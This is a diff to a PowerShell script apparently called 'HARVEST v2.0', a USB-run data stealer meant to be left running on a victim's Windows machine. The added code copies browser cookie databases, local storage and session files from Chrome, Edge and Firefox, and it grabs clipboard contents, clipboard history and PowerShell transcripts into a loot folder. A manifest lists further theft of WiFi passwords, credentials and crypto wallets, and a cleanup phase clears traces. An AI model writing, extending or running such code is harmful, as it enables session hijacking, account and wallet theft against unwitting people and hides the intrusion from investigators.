@@ -1,10 +1,11 @@
 <# ═══════════════════════════════════════════════════════════════════════
    FLLC | FU PERSON | HARVEST v2.0
-   Zero-dependency. Pure PowerShell. One file does everything.
-   
-   Insert USB → Run → Walk away → Retrieve MicroSD later.
-   
-   NO Java. NO Python. NO installs. Just native Windows.
+   ╔══════════════════════════════════════════════════════════════════╗
+   ║  Zero-dependency. Pure PowerShell. One file does everything.     ║
+   ║  Insert USB → Run → Walk away → Retrieve MicroSD later.         ║
+   ║  NO Java. NO Python. NO installs. Just native Windows.           ║
+   ║  13 extraction phases + trace cleanup. ~60 seconds total.        ║
+   ╚══════════════════════════════════════════════════════════════════╝
 ═══════════════════════════════════════════════════════════════════════ #>
 
 $ErrorActionPreference = 'SilentlyContinue'
@@ -753,23 +754,108 @@ $manifest = @"
  Arch:      $env:PROCESSOR_ARCHITECTURE
 ═══════════════════════════════════════════════════
  Phases Completed:
-   [x] System Reconnaissance
-   [x] Network Intelligence
-   [x] WiFi Passwords
-   [x] Browser Data (7 browsers)
-   [x] Windows Credentials
-   [x] Application Data (Discord/Telegram/Slack/Teams/Signal)
-   [x] File Hunting + Password Grep
-   [x] Crypto Wallets (11 wallets)
-   [x] Privilege Escalation Recon
-   [x] Screenshot + Clipboard
+   [+] System Reconnaissance
+   [+] Network Intelligence
+   [+] WiFi Passwords
+   [+] Browser Data (7 browsers)
+   [+] Windows Credentials
+   [+] Application Data (Discord/Telegram/Slack/Teams/Signal)
+   [+] File Hunting + Password Grep
+   [+] Crypto Wallets (11 wallets)
+   [+] Privilege Escalation Recon
+   [+] Screenshot + Clipboard
+   [+] Browser Session Tokens
+   [+] Clipboard History + Transcripts
+   [+] Trace Cleanup
 ═══════════════════════════════════════════════════
 "@
 
 $manifest | Out-File "$LOOT_DIR\MANIFEST.txt" -Encoding utf8
 
 # ═══════════════════════════════════════════════════════════════════════
-# PHASE 12: CLEANUP
+# PHASE 12: BROWSER SESSION TOKENS
+# ═══════════════════════════════════════════════════════════════════════
+
+$tokenDir = "$LOOT_DIR\session_tokens"
+New-Item -ItemType Directory -Path $tokenDir -Force | Out-Null
+
+$chromeCookieDB = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
+$edgeCookieDB = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"
+$firefoxProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
+
+if (Test-Path $chromeCookieDB) {
+    Copy-Item $chromeCookieDB "$tokenDir\chrome_cookies.db" -Force 2>$null
+}
+if (Test-Path $edgeCookieDB) {
+    Copy-Item $edgeCookieDB "$tokenDir\edge_cookies.db" -Force 2>$null
+}
+
+$chromeLS = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb"
+$edgeLS = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
+if (Test-Path $chromeLS) {
+    Copy-Item $chromeLS "$tokenDir\chrome_localstorage" -Recurse -Force 2>$null
+}
+if (Test-Path $edgeLS) {
+    Copy-Item $edgeLS "$tokenDir\edge_localstorage" -Recurse -Force 2>$null
+}
+
+if (Test-Path $firefoxProfiles) {
+    Get-ChildItem $firefoxProfiles -Directory | ForEach-Object {
+        $ffCookies = Join-Path $_.FullName "cookies.sqlite"
+        $ffStorage = Join-Path $_.FullName "webappsstore.sqlite"
+        if (Test-Path $ffCookies) {
+            Copy-Item $ffCookies "$tokenDir\firefox_cookies_$($_.Name).db" -Force 2>$null
+        }
+        if (Test-Path $ffStorage) {
+            Copy-Item $ffStorage "$tokenDir\firefox_storage_$($_.Name).db" -Force 2>$null
+        }
+    }
+}
+
+$sessionPaths = @(
+    @{ Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Sessions"; Name = "chrome_sessions" },
+    @{ Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Sessions"; Name = "edge_sessions" }
+)
+foreach ($sp in $sessionPaths) {
+    if (Test-Path $sp.Path) {
+        Copy-Item $sp.Path "$tokenDir\$($sp.Name)" -Recurse -Force 2>$null
+    }
+}
+
+# ═══════════════════════════════════════════════════════════════════════
+# PHASE 13: CLIPBOARD HISTORY + TRANSCRIPT LOGS
+# ═══════════════════════════════════════════════════════════════════════
+
+$clipDir = "$LOOT_DIR\clipboard"
+New-Item -ItemType Directory -Path $clipDir -Force | Out-Null
+
+try {
+    Add-Type -AssemblyName System.Windows.Forms
+    $clipText = [System.Windows.Forms.Clipboard]::GetText()
+    if ($clipText) {
+        $clipText | Out-File "$clipDir\current_clipboard.txt" -Encoding utf8
+    }
+} catch { }
+
+$clipHistoryPath = "$env:LOCALAPPDATA\Microsoft\Windows\Clipboard"
+if (Test-Path $clipHistoryPath) {
+    Copy-Item $clipHistoryPath "$clipDir\clipboard_history" -Recurse -Force 2>$null
+}
+
+$transcriptPaths = @(
+    "$env:USERPROFILE\Documents\PowerShell_transcript*",
+    "$env:USERPROFILE\Documents\*transcript*",
+    "C:\Transcripts\*"
+)
+foreach ($tp in $transcriptPaths) {
+    $files = Get-ChildItem $tp -File 2>$null
+    foreach ($f in $files) {
+        Copy-Item $f.FullName "$clipDir\$($f.Name)" -Force 2>$null
+    }
+}
+
+# ═══════════════════════════════════════════════════════════════════════
+# PHASE 14: CLEANUP
 # ═══════════════════════════════════════════════════════════════════════
 
 # Clear PowerShell history for this session
